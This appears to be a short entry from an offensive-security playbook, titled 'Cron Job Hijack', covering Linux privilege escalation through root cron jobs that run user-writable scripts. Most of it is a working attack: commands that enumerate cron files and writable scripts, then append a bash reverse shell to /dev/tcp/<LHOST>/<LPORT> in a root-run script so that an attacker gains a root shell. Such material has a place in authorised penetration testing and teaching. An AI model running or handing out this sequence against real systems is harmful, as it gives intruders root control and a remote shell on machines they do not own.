# 12.01 Cron Job Hijack

> Trojanize a root-owned but user-writable script referenced by `/etc/cron.d/*` to land a root shell on the next tick.

## Overview

Root cron jobs that reference writable scripts/binaries = privesc. Common pattern: /etc/cron.d/* runs /opt/scripts/x.sh owned by root but writable by users.

## Steps

- **Inventory cron** — /etc/crontab, /etc/cron.{d,daily,hourly,monthly}.
- **Check ownership/perms** — `ls -la` referenced scripts.
- **Append reverse shell** if writable; wait for next run.

## Commands

### Discover + abuse

```bash
cat /etc/crontab; ls -la /etc/cron.*; cat /etc/cron.d/*
find / -path /proc -prune -o -type f -writable -print 2>/dev/null | grep -E 'cron|backup|run'
echo 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' >> /opt/backup.sh
```
